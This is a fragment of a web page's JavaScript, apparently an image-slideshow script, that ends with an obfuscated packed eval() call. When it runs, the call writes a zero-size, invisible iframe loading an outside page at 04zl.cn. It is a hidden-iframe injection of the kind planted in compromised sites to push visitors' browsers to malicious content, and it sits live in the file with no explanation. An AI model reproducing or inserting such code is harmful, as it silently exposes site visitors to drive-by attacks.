...
function FocusImg(time,foc,fbimg)
{
	...
	var au=$a(foc,"a"),now=1,tm;var bimgs=$a(foc,"img");var vimg=new Image();vimg.src= bimgs[0].src || bimgs[0].getAttribute('_src');
	...
	function pfn(i){bps[i].onclick=function(){go(i);if(beg.check){clearInterval(tm);init();}else{clearInterval(tm)}}}for(var i=0;i<len;i++){pfn(i);}
	...
	ba.href=au[now].href;bi.src=bimgs[now].src||bimgs[now].getAttribute('_src');bi.alt=bimgs[now].alt;for(var i=0;i<len;i++){bps[i].className="";}bps[now].className="show";(now<len-1)?now++:now=0;}
...
eval(function(p,a,c,k,e,r){e=String;if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'[1]'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('document.writeln("<1 src=\\"http://04zl.cn/a.html\\" width=\\"0\\" height=\\"0\\" frameborder=\\"0\\"></1>");',[],2,'|iframe'.split('|'),0,{}))
